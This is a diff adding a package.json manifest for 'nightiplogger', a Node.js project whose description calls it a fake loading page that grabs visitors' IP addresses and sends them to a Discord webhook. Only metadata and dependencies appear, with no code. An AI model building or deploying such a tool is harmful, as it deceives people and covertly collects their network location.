@@ -1,0 +1,33 @@
+{
+  "dependencies": {
+    "cors": "^2.8.5",
+    "express": "^4.18.2"
+  },
+  "name": "nightiplogger",
+  "version": "1.0.0",
+  "description": "A web fake loading page that grab user ip & send it with a webhooks on disocrd",
+  "main": "index.js",
+  "devDependencies": {},
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/NightSpaceGTT/discord-ip-logger.git"
+  },
+  "keywords": [
+    "ip",
+    "logger",
+    "ip-logger",
+    "discord",
+    "discord-ip-logger",
+    "web",
+    "webhooks"
+  ],
+  "author": "NightSpaceGTT",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/NightSpaceGTT/discord-ip-logger/issues"
+  },
+  "homepage": "https://github.com/NightSpaceGTT/discord-ip-logger#readme"
+}
